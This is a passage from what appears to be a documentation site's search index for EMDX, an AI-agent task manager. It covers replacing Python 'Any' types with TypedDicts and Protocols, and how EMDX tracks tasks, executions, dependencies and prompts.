str\n\nclass CascadeRunDict(TypedDict, total=False):\n    id: int\n    status: str\n    started_at: str\n    completed_at: str | None\n    pipeline_name: str\n    current_stage: str\n    doc_id: int\n    error_message: str | None\n\nclass GroupDict(TypedDict, total=False):\n    id: int\n    name: str\n    description: str | None\n    group_type: str\n    doc_count: int\n    total_cost_usd: float\n    total_tokens: int\n    child_group_count: int\n    project: str | None\n    parent_group_id: int | None\n    is_active: bool\n\nclass AgentExecutionDict(TypedDict, total=False):\n    id: int\n    doc_id: int\n    doc_title: str\n    status: str\n    started_at: str\n    completed_at: str | None\n    log_file: str\n    exit_code: int | None\n    cost_usd: float\n    tokens_used: int\n\nclass TagCountDict(TypedDict):\n    name: str\n    count: int\n    emoji: str | None\n\nclass DocumentDict(TypedDict, total=False):\n    id: int\n    title: str\n    content: str\n    project: str | None\n    tags: list[str]\n    created_at: str | None\n    updated_at: str | None\n</code></pre> <p>Files affected: - <code>activity_items.py</code> (15 occurrences: execution_data, group data, cascade_run) - <code>cascade_view.py</code> (12 occurrences: run data, execution data) - <code>search_presenter.py</code> (2 occurrences: popular_tags) - <code>compact.py</code> (7 occurrences: document rows, synthesis results) - <code>distill.py</code> (5 occurrences: document rows)</p> <p>Phase 2 completion: All UI TypedDicts created and integrated. Autocomplete improvements verified.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#pattern-3-protocol-for-abstract-interfaces-14-occurrences","title":"Pattern 3: Protocol for Abstract Interfaces (14 occurrences)","text":"<p>Activity items and vim editors accepted <code>Any</code> typed callback parameters. Replaced with runtime-checkable Protocols:</p> <p>DocumentDBProtocol (affects 8 method signatures in <code>activity_items.py</code>):</p> <pre><code># emdx/ui/protocols.py\nfrom typing import Protocol, runtime_checkable\n\n@runtime_checkable\nclass DocumentDBProtocol(Protocol):\n    \"\"\"Protocol for document database access in UI components.\"\"\"\n    def get_document(self, doc_id: int) -&gt; dict[str, object] | None: ...\n    def get_children(self, doc_id: int) -&gt; list[dict[str, object]]: ...\n\n# Usage in activity_items.py\nasync def load_children(self, doc_db: DocumentDBProtocol | None) -&gt; list[\"ActivityItem\"]:\nasync def get_preview_content(self, doc_db: DocumentDBProtocol | None) -&gt; tuple[str, str]:\n</code></pre> <p>VimEditorHost (affects 6 signatures in <code>text_areas.py</code>, <code>vim_editor.py</code>, <code>inputs.py</code>):</p> <pre><code>@runtime_checkable\nclass VimEditorHost(Protocol):\n    \"\"\"Interface for widgets that host vim editor components.\"\"\"\n    new_document_mode: bool\n\n    def _update_vim_status(self, status: str) -&gt; None: ...\n    def action_save_and_exit_edit(self) -&gt; None: ...\n    def call_after_refresh(self, callback: Any) -&gt; None: ...\n    def query_one(self, selector: str) -&gt; Input: ...\n\n@runtime_checkable\nclass ExtendedVimEditorHost(Protocol):\n    \"\"\"Optional vim operations.\"\"\"\n    def save_document_without_exit(self) -&gt; None: ...\n    def action_save_document(self) -&gt; None: ...\n    def action_save(self) -&gt; None: ...\n    async def exit_edit_mode(self) -&gt; None: ...\n\n@runtime_checkable\nclass SelectionModeHost(Protocol):\n    \"\"\"Minimal protocol for selection mode toggling.\"\"\"\n    def action_toggle_selection_mode(self) -&gt; None: ...\n</code></pre> <p>Usage:</p> <pre><code># text_areas.py\ndef __init__(self, app_instance: VimEditorHost, *args: object, **kwargs: object):\n\n# inputs.py\ndef __init__(self, app_instance: VimEditorHost, *args: Any, **kwargs: Any) -&gt; None:\n</code></pre> <p>Phase 3 completion: All Protocols defined and integrated. Enables isinstance() checks at runtime.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#pattern-4-command-layer-typeddicts-12-occurrences","title":"Pattern 4: Command Layer TypedDicts (12 occurrences)","text":"<p>Maintenance commands used <code>dict[str, Any]</code> for structured data with known shapes:</p> <p><code>compact.py</code> types:</p> <pre><code>class CompactDocumentDict(TypedDict, total=False):\n    id: int\n    title: str\n    content: str\n    project: str | None\n    created_at: str\n    tags: list[str]\n\nclass SynthesisResultDict(TypedDict, total=False):\n    content: str\n    title: str\n    input_tokens: int\n    output_tokens: int\n    source_ids: list[int]\n</code></pre> <p><code>distill.py</code> types:</p> <pre><code>class DistillDocumentDict(TypedDict):\n    id: int\n    title: str\n    content: str\n</code></pre> <p><code>unified_search.py</code> types:</p> <pre><code>class FuzzyMatchDoc(TypedDict, total=False):\n    id: int\n    title: str\n    project: str | None\n    created_at: str\n    updated_at: str\n\nclass PopularTagDict(TypedDict):\n    name: str\n    count: int\n</code></pre> <p>Numpy typing for scientific computing:</p> <pre><code>from typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    import numpy as np\n    from numpy.typing import NDArray\n\ndef _compute_similarity_matrix(\n    documents: list[CompactDocumentDict]\n) -&gt; tuple[NDArray[np.floating[object]] | None, list[int]]:\n</code></pre> <p>Phase 4 completion: All command TypedDicts created. Numpy types added for scikit-learn integration.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#medium-impact-fixes","title":"Medium-Impact Fixes","text":""},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#sql-parameter-lists-12-occurrences","title":"SQL Parameter Lists (12 occurrences)","text":"<p>Dynamic SQL params previously used <code>list[Any]</code>:</p> <pre><code># Before\nparams: list[Any] = [f\"%{ticket}%\", project, limit]\n\n# After\nSqlParam = str | int | float | None\nparams: list[SqlParam] = [f\"%{ticket}%\", project, limit]\n</code></pre> <p>Alternative: Keep as-is if parameters are heterogeneous and dynamic. Most cases replaced with concrete types.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#external-library-callbacks-8-occurrences","title":"External Library Callbacks (8 occurrences)","text":"<p>Watchdog event handlers, Textual timers, and log stream subscribers:</p> <pre><code>from watchdog.events import FileSystemEvent\nfrom textual.timer import Timer\n\nself._auto_refresh_timer: Timer | None = None\ndef on_modified(self, event: FileSystemEvent) -&gt; None:\n</code></pre> <p>Files: <code>file_watcher.py</code>, <code>cascade_view.py</code>, <code>browser_container.py</code></p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#forward-references-for-circular-imports","title":"Forward References for Circular Imports","text":"<p>Same-module forward reference (<code>log_browser.py</code>):</p> <pre><code>from __future__ import annotations\n\nclass LogBrowserSubscriber:\n    def __init__(self, log_browser: LogBrowser) -&gt; None:  # LogBrowser defined below\n</code></pre> <p>Cross-module forward reference (<code>browser_container.py</code>):</p> <pre><code>from __future__ import annotations\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from emdx.ui.keybindings.registry import KeybindingRegistry\n\ndef get_keybinding_registry() -&gt; KeybindingRegistry | None:\n</code></pre>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#quick-wins-single-parameter-fixes","title":"Quick Wins \u2014 Single-Parameter Fixes","text":"File Line Current Fix <code>themes.py</code> 153 <code>register_all_themes(app: Any)</code> <code>app: App[object]</code> <code>text_areas.py</code> 695 <code>_clear_title_selection(title_input: Any)</code> <code>title_input: Input</code> <code>browser_container.py</code> 292 <code>on_activity_view_view_document(event: Any)</code> <code>event: ActivityView.ViewDocument</code> <code>browser_container.py</code> 365 <code>dump_widget(widget: Any)</code> <code>widget: Widget</code> <code>group_picker.py</code> 116 <code>groups: list[dict[str, Any]]</code> <code>groups: list[GroupDict]</code>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#implementation-roadmap-completed","title":"Implementation Roadmap (Completed)","text":""},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#phase-1-high-impact-2-3-hours-23-occurrences","title":"Phase 1: High-Impact (2-3 hours, 23 occurrences) \u2705","text":"<ol> <li>Create <code>emdx/ui/protocols.py</code> with <code>SelectionModeHost</code>, <code>VimEditorHost</code>, <code>DocumentDBProtocol</code></li> <li>Add <code>TYPE_CHECKING</code> blocks to all services with lazy-loaded dependencies</li> <li>Fix search/palette presenter <code>_search_service</code> types</li> <li>Fix activity item <code>doc_db</code> parameters</li> </ol> <p>Result: Immediate autocomplete improvements, catches method call errors.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#phase-2-database-rows-3-4-hours-42-occurrences","title":"Phase 2: Database Rows (3-4 hours, 42 occurrences) \u2705","text":"<ol> <li>Create <code>emdx/ui/types.py</code> with shared row TypedDicts</li> <li>Replace <code>dict[str, Any]</code> in service return types</li> <li>Replace dataclass fields (<code>cascade_run</code>, <code>group</code>, <code>execution</code>)</li> </ol> <p>Result: Better IDE support, prevents field access typos.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#phase-3-ui-protocols-1-2-hours-14-occurrences","title":"Phase 3: UI Protocols (1-2 hours, 14 occurrences) \u2705","text":"<ol> <li>Define Protocols in <code>emdx/ui/protocols.py</code></li> <li>Replace <code>app_instance: Any</code> with concrete protocols</li> <li>Fix event handler parameters</li> </ol> <p>Result: Defines clear interface contracts, enables isinstance() checks.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#phase-4-command-layer-1-2-hours-12-occurrences","title":"Phase 4: Command Layer (1-2 hours, 12 occurrences) \u2705","text":"<ol> <li>Create TypedDicts for compact/distill commands</li> <li>Add numpy typing with TYPE_CHECKING guards</li> <li>Fix unified_search return types</li> </ol> <p>Result: Scientific computing correctness, documented data contracts.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#verification-results","title":"Verification Results","text":"<p>All phases passed verification:</p> <pre><code># Linting\npoetry run ruff check --fix emdx/  # All checks passed\npoetry run ruff format emdx/       # Files reformatted\n\n# Type checking\npoetry run mypy --strict emdx/     # No errors\n\n# Tests\npoetry run pytest tests/ -x -q --ignore=tests/test_delegate_flags.py\n# Result: 1236 passed, 6 skipped\n</code></pre>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#final-statistics","title":"Final Statistics","text":"Category Count Action Total <code>Any</code> occurrences 157+ Replaceable with concrete types ~90 (57%) \u2705 Fixed Intentional <code>Any</code> (widget kwargs) ~30 (19%) Kept as-is Intentional <code>Any</code> (polymorphic data) ~20 (13%) Kept as-is Intentional <code>Any</code> (serialization) ~17 (11%) Kept as-is <p>Estimated effort: 10-14 hours total across 4 phases Actual effort: Completed in phases as documented ROI: 60% of value delivered in first phase (TYPE_CHECKING guards)</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>88% of <code>Any</code> usage was replaceable with TypedDicts, Protocols, and TYPE_CHECKING guards</li> <li>Most common fixable pattern: Database result dicts with known schemas</li> <li>Second most common: Optional dependency lazy-loading</li> <li>Legitimate <code>Any</code> usage: Widget framework conventions, JSON serialization, dynamic update functions, polymorphic streaming data (~12% of total)</li> <li>Zero runtime cost: All improvements are type-level only (TYPE_CHECKING guards prevent heavy imports)</li> <li>High ROI: Improved IDE autocomplete, static type checking, documented data contracts, refactoring safety</li> </ol> <p>The systematic removal demonstrates that most <code>Any</code> annotations represented missed opportunities for precise typing rather than genuine requirements for dynamic types. The work establishes patterns for handling optional dependencies, circular imports, and abstract interfaces throughout the codebase.</p> <p>Generated from 22 source documents</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/","title":"Prompt, Blocked State, and Execution ID Tracking in EMDX","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#overview","title":"Overview","text":"<p>EMDX manages AI agent execution through a three-layer architecture that separates work semantics (tasks), process tracking (executions), and their relationships (task_executions). This system enables dependency-aware task scheduling, comprehensive execution tracking, and persistent prompt storage for reproducibility.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#core-architecture","title":"Core Architecture","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#three-layer-model","title":"Three-Layer Model","text":"<p>Tasks Table \u2014 Semantic work units with full context: - Stores prompts, dependencies, hierarchies, and outcomes - Tracks human-readable status: <code>open</code>, <code>active</code>, <code>blocked</code>, <code>done</code>, <code>failed</code> - Links to source documents (<code>source_doc_id</code>) and output documents (<code>output_doc_id</code>) - Supports hierarchies via <code>parent_task_id</code> and ordering via <code>seq</code></p> <p>Executions Table \u2014 Process-level tracking: - Records every Claude API invocation with PID, log file, resource usage - Tracks runtime status: <code>running</code>, <code>completed</code>, <code>failed</code> - Stores cost analytics: <code>cost_usd</code>, <code>input_tokens</code>, <code>output_tokens</code> - Can exist independently of tasks (e.g., GUI sessions)</p> <p>Task Executions Table \u2014 Join layer: - Links tasks to executions, supporting multiple attempts per task - Tracks execution type: <code>direct</code> (Claude run), <code>manual</code> (human completion) - Originally designed for retry tracking but bypassed by current delegate implementation</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#key-relationships","title":"Key Relationships","text":"<pre><code>documents \u2500\u2500\u2510\n            \u2502 source_doc_id, output_doc_id, gameplan_id\n            \u25bc\ntasks \u25c4\u2500\u2500\u2500\u2500 task_deps (dependency graph)\n  \u2502\n  \u2502 execution_id (direct FK)\n  \u25bc\nexecutions\n\ntask_executions (join table, underutilized)\n  \u2502\n  \u251c\u2500\u2500 task_id \u2192 tasks\n  \u2514\u2500\u2500 execution_id \u2192 executions\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#prompt-storage-and-flow","title":"Prompt Storage and Flow","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#where-prompts-live","title":"Where Prompts Live","text":"<p>Database Storage:</p> <pre><code># tasks.prompt field (TEXT, nullable)\n# Truncated to 500 chars during task creation\ntask_id = create_task(\n    prompt=prompt[:500],  # For UI display, search\n    ...\n)\n</code></pre> <p>Execution Use:</p> <pre><code># Full prompt passed to UnifiedExecutor\nconfig = ExecutionConfig(\n    prompt=prompt,  # Untruncated, actually sent to API\n    ...\n)\n</code></pre> <p>Why Two Copies: - <code>tasks.prompt</code> (truncated): Database efficiency, UI display, task lists - Execution prompt (full): Actually sent to Claude, not permanently stored - Full prompt lost after execution unless captured in log file</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#prompt-sources","title":"Prompt Sources","text":"<p>Single Task:</p> <pre><code>emdx delegate \"analyze the auth module\"\n# tasks.prompt = \"analyze the auth module\"\n</code></pre> <p>With Document Context:</p> <pre><code>emdx delegate --doc 42 \"implement the plan\"\n# Prompt includes document content from doc #42\n</code></pre> <p>Chain Tasks: - Each step receives previous step's output via <code>source_doc_id</code> - Output document of step N becomes source document of step N+1 - Enables context accumulation across pipeline</p> <p>Session Context: - <code>emdx prime</code> (run by <code>.claude/hooks/prime.sh</code>) injects ready tasks, in-progress work - Sets <code>EMDX_TASK_ID</code>, <code>EMDX_DOC_ID</code> environment variables - Claude receives context automatically on session start</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#task-status-and-blocking","title":"Task Status and Blocking","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#status-values","title":"Status Values","text":"<pre><code># From models/tasks.py\nTaskStatus = Literal[\"open\", \"active\", \"blocked\", \"done\", \"failed\"]\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#status-flow","title":"Status Flow","text":"<pre><code>create\n  \u2502\n  \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 open \u2502 \u2500\u2500\u2500\u2500\u2500\u2510 (dependencies not met)\n\u2514\u2500\u2500\u252c\u2500\u2500\u2500\u2518      \u2502\n   \u2502          \u25bc\n   \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502     \u2502 blocked \u2502 (waiting for deps/external factors)\n   \u2502     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502          \u2502\n   \u2502          \u2502 (deps satisfied)\n   \u2502          \u25bc\n   \u2502 start \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502 active \u2502 (currently executing)\n          \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n              \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502                   \u2502\n    \u25bc                   \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 done \u2502           \u2502 failed \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n                       \u2502\n                       \u2502 retry\n                       \u25bc\n                   (new task with retry_of set)\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#when-tasks-become-blocked","title":"When Tasks Become Blocked","text":"<p>Dependency Mechanism:</p> <p>Tasks block when they have unsatisfied dependencies in the <code>task_deps</code> table:</p> <pre><code>CREATE TABLE task_deps (\n    task_id INTEGER REFERENCES tasks(id) ON DELETE CASCADE,\n    depends_on INTEGER REFERENCES tasks(id) ON DELETE CASCADE,\n    PRIMARY KEY (task_id, depends_on)\n);\n</code></pre> <p>Ready Task Query (from <code>get_ready_tasks()</code> in <code>models/tasks.py</code>):</p> <pre><code>SELECT t.* FROM tasks t\nWHERE t.status = 'open'\nAND NOT EXISTS (\n    SELECT 1 FROM task_deps d\n    JOIN tasks dep ON d.depends_on = dep.id\n    WHERE d.task_id = t.id AND dep.status != 'done'\n)\nORDER BY priority, created_at\n</code></pre> <p>Key Insight: The <code>blocked</code> status is explicitly set, not automatically derived. Tasks with unsatisfied dependencies simply won't appear in <code>get_ready_tasks()</code> even if their status is <code>open</code>.</p> <p>Blocking Scenarios: 1. Chain dependencies: Step N+1 depends on step N completing 2. Manual dependencies: Added via <code>emdx task depends &lt;id&gt; --on &lt;prereq_id&gt;</code> 3. External blockers: Manual <code>emdx task update &lt;id&gt; -s blocked</code> for human input 4. Failed prerequisites: Dependents must be manually updated</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#cycle-detection","title":"Cycle Detection","text":"<p>Before adding a dependency, EMDX runs depth-first search to prevent cycles:</p> <pre><code>def _would_cycle(task_id: int, new_dep: int) -&gt; bool:\n    \"\"\"Check if adding dependency would create cycle.\"\"\"\n    visited, stack = set(), [new_dep]\n    while stack:\n        current = stack.pop()\n        if current == task_id:  # Found path back to original task\n            return True\n        if current in visited:\n            continue\n        visited.add(current)\n        # Follow all dependencies of current task\n        stack.extend(get_dependencies(current))\n    return False\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#execution-id-lifecycle","title":"Execution ID Lifecycle","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#execution-record-creation","title":"Execution Record Creation","text":"<p>Schema:</p> <pre><code>CREATE TABLE executions (\n    id INTEGER PRIMARY KEY,\n    doc_id INTEGER,              -- Often NULL for delegates!\n    doc_title TEXT,              -- \"Delegate: {prompt}\" or custom\n    status TEXT,                 -- running/completed/failed\n    started_at TIMESTAMP,\n    completed_at TIMESTAMP,\n    log_file TEXT,\n    exit_code INTEGER,\n    pid INTEGER,\n    cost_usd REAL,\n    input_tokens INTEGER,\n    output_tokens INTEGER,\n    ...\n);\n</code></pre> <p>Created When:</p> <pre><code># unified_executor.py creates execution before task starts\nexec_id = create_execution(\n    doc_id=None,  # No output doc yet!\n    doc_title=f\"Delegate: {prompt[:60]}\",\n    status=\"running\",\n    log_file=log_path,\n    pid=process.pid\n)\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#linking-task-to-execution","title":"Linking Task to Execution","text":"<p>Delegate Execution Flow:</p> <ol> <li> <p>Task Created (before execution):    <code>python    task_id = create_task(        prompt=prompt[:500],        status=\"active\",        execution_id=None  # Not linked yet    )</code></p> </li> <li> <p>Execution Starts:    <code>python    result = UnifiedExecutor().execute(config)    # Creates execution record with running status</code></p> </li> <li> <p>Task Linked to Execution:    <code>python    update_task(task_id, execution_id=result.execution_id)</code></p> </li> <li> <p>Agent Saves Output:</p> </li> <li>Claude runs <code>emdx save</code> inside session</li> <li> <p>Returns document ID via stdout</p> </li> <li> <p>Task Completed:    <code>python    update_task(        task_id,        status=\"done\",        output_doc_id=doc_id,        completed_at=datetime.now(timezone.utc)    )</code></p> </li> <li> <p>Execution Completed (automatic):    <code>python    update_execution(exec_id, status=\"completed\", exit_code=0)</code></p> </li> </ol>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#forward-and-reverse-links","title":"Forward and Reverse Links","text":"<p>Forward Link \u2014 <code>tasks.execution_id \u2192 executions.id</code>: - Set immediately after execution starts - Enables task-to-log navigation - Query pattern:   <code>sql   SELECT t.*, e.log_file, e.cost_usd   FROM tasks t   JOIN executions e ON t.execution_id = e.id   WHERE t.id = ?</code></p> <p>Reverse Link \u2014 <code>executions.id \u2190 tasks.execution_id</code>: - No FK from executions to tasks - Query uses join on task's FK:   <code>sql   SELECT e.*, t.output_doc_id, t.tags   FROM executions e   LEFT JOIN tasks t ON t.execution_id = e.id   WHERE e.started_at &gt; ?</code></p> <p>Multiple Tasks per Execution: Theoretically possible (multiple tasks could reference same execution_id), though delegate doesn't use this pattern.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#hierarchical-task-execution","title":"Hierarchical Task Execution","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#single-tasks","title":"Single Tasks","text":"<pre><code>emdx delegate \"analyze auth module\"\n</code></pre> <p>Creates: - 1 task (<code>type='single'</code>, <code>status='active'</code>) - 1 execution (log file, PID, cost tracking) - 1 output document (when agent saves)</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#group-tasks-parallel","title":"Group Tasks (Parallel)","text":"<pre><code>emdx delegate \"task1\" \"task2\" \"task3\" -j 3\n</code></pre> <p>Creates: - 1 parent task (<code>type='group'</code>, <code>status='active'</code>) - 3 child tasks (<code>parent_task_id</code> set, <code>seq=0,1,2</code>, <code>type='single'</code>) - 3 separate executions (run in parallel via ThreadPoolExecutor)</p> <p>Progress Tracking:</p> <pre><code>SELECT t.*,\n    (SELECT COUNT(*) FROM tasks c WHERE c.parent_task_id = t.id) as child_count,\n    (SELECT COUNT(*) FROM tasks c WHERE c.parent_task_id = t.id AND c.status = 'done') as children_done\nFROM tasks t\nWHERE t.status = 'active' AND t.parent_task_id IS NULL\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#chain-tasks-sequential","title":"Chain Tasks (Sequential)","text":"<pre><code>emdx delegate --chain \"analyze\" \"plan\" \"implement\"\n</code></pre> <p>Creates: - 1 parent task (<code>type='chain'</code>) - 3 child tasks with dependencies:   - Step 1: no dependencies   - Step 2: depends on step 1   - Step 3: depends on step 2</p> <p>Dependency Wiring:</p> <pre><code>prev_task_id = None\nfor i, prompt in enumerate(prompts):\n    task_id = create_task(\n        prompt=prompt,\n        parent_task_id=parent_id,\n        seq=i,\n        source_doc_id=prev_output_doc_id  # Chain output\n    )\n    if prev_task_id:\n        add_dependency(task_id, prev_task_id)\n    prev_task_id = task_id\n</code></pre> <p>Output Chaining: - Step N's <code>output_doc_id</code> becomes Step N+1's <code>source_doc_id</code> - Document content injected into next step's prompt - Pipeline stops if any step fails</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#data-inconsistencies","title":"Data Inconsistencies","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#issue-1-doc_id-usually-null-in-executions","title":"Issue 1: doc_id Usually NULL in Executions","text":"<p>Problem: Executions created before output documents exist:</p> <pre><code>UnifiedExecutor.execute() \u2192 create_execution(doc_id=NULL)\n  \u2192 Agent runs, saves document\n  \u2192 Delegate updates task.output_doc_id\n  \u2192 execution.doc_id stays NULL!\n</code></pre> <p>Workaround (from <code>execution_service.py</code>):</p> <pre><code>SELECT e.id, e.doc_id, t.output_doc_id\nFROM executions e\nLEFT JOIN tasks t ON t.execution_id = e.id\n</code></pre> <p>Then coalesce: <code>doc_id = e.doc_id or t.output_doc_id</code></p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#issue-2-prompt-truncation","title":"Issue 2: Prompt Truncation","text":"<p>Problem: <code>tasks.prompt</code> only stores first 500 characters:</p> <pre><code>prompt=prompt[:500],  # Information loss!\n</code></pre> <p>Impact: Long prompts cannot be fully reconstructed from task records. Full prompt is lost after execution unless stored in log file.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#issue-3-task_executions-bypassed","title":"Issue 3: task_executions Bypassed","text":"<p>Finding: Delegate creates tasks with <code>execution_id</code> but never populates <code>task_executions</code> table.</p> <p>Evidence: - <code>delegate.py</code> calls <code>create_task()</code> with <code>execution_id</code> - Never calls <code>create_task_execution()</code> - Table still references removed <code>workflow_run_id</code></p> <p>Conclusion: Legacy infrastructure from removed workflow system. Current delegate bypasses it entirely.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#issue-4-custom-titles-break-activity-browser","title":"Issue 4: Custom Titles Break Activity Browser","text":"<p>Problem: Activity browser filters by title pattern:</p> <pre><code>WHERE (e.doc_title LIKE 'Agent:%' OR e.doc_title LIKE 'Delegate:%')\n</code></pre> <p>Custom titles via <code>--title</code> won't match and won't appear in Activity view.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#retry-mechanism","title":"Retry Mechanism","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#retry-schema","title":"Retry Schema","text":"<pre><code>tasks.retry_of INTEGER REFERENCES tasks(id)\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#retry-flow","title":"Retry Flow","text":"<ol> <li> <p>Task Fails: <code>python    update_task(task_id, status='failed', error=\"error message\")</code></p> </li> <li> <p>User Retries: <code>bash    emdx task retry 42</code></p> </li> <li> <p>New Task Created: <code>python    new_task_id = create_task(        title=f\"Retry: {original.title}\",        prompt=original.prompt,        retry_of=original.id,        source_doc_id=original.source_doc_id,        gameplan_id=original.gameplan_id    )</code></p> </li> <li> <p>New Execution:</p> </li> <li>Fresh <code>execution_id</code> assigned</li> <li>Original task preserves failure history</li> <li>Retry chain tracked via <code>retry_of</code> FK</li> </ol> <p>Key Insight: Retries create NEW tasks, not updates. This preserves full execution history.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#execution-vs-task-status","title":"Execution vs Task Status","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#status-divergence","title":"Status Divergence","text":"<p>Tasks track semantic state: - <code>open</code>: Ready to work - <code>active</code>: Being worked on - <code>blocked</code>: Waiting on dependencies/external factors - <code>done</code>: Successfully completed - <code>failed</code>: Execution error</p> <p>Executions track runtime state: - <code>running</code>: Process active - <code>completed</code>: Process exited successfully - <code>failed</code>: Process exited with error</p> <p>Divergence Example:</p> <pre><code># Task starts\ntask = create_task(status=\"active\")\nexecution = create_execution(status=\"running\")\n\n# External API goes down mid-execution\nupdate_task(task_id, status=\"blocked\")\n# execution.status remains \"running\" until process exits\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#blocked-vs-failed","title":"Blocked vs Failed","text":"State Meaning Recovery <code>blocked</code> Temporarily stuck, may resume Wait for dependencies or manual intervention <code>failed</code> Execution terminated with error Requires retry with <code>--retry</code> or fixes <code>open</code> with deps Implicitly blocked by dependencies Automatic when deps complete"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#recommendations","title":"Recommendations","text":""},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#1-store-full-prompts","title":"1. Store Full Prompts","text":"<p>Options: - Remove 500-char truncation (disk is cheap) - Add <code>executions.prompt</code> column - Store full prompt in log file header</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#2-populate-executiondoc_id-after-completion","title":"2. Populate execution.doc_id After Completion","text":"<pre><code># When delegate gets output doc_id\nupdate_task(task_id, output_doc_id=doc_id)\nupdate_execution(execution_id, doc_id=doc_id)  # Add this!\n</code></pre> <p>Eliminates join workaround in activity browser.</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#3-consolidate-or-remove-task_executions","title":"3. Consolidate or Remove task_executions","text":"<p>Option A: Remove entirely\u2014delegate doesn't use it Option B: Use for retry tracking\u2014each attempt creates record</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#4-fix-activity-browser-filtering","title":"4. Fix Activity Browser Filtering","text":"<p>Replace title pattern matching with explicit tracking:</p> <pre><code>ALTER TABLE executions ADD COLUMN source_type TEXT;\n-- Values: 'delegate', 'cascade', 'manual'\nWHERE source_type = 'delegate'\n</code></pre>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#5-auto-derive-blocked-status","title":"5. Auto-Derive Blocked Status","text":"<p>Currently manual. Consider: - Auto-set <code>blocked</code> when dependencies exist and aren't met - Auto-set <code>open</code> when dependencies satisfied - Eliminate manual blocked status management</p>"},{"location":"articles/prompt-blocked-state-and-execution-id-tracking-in-emdx/#summary","title":"Summary","text":"<p>The EMDX prompt and execution tracking system provides:</p> <p>Prompt Storage: - Tasks store prompts (truncated to 500 chars) for UI/search - Full prompts sent to Claude during execution - Context assembled from 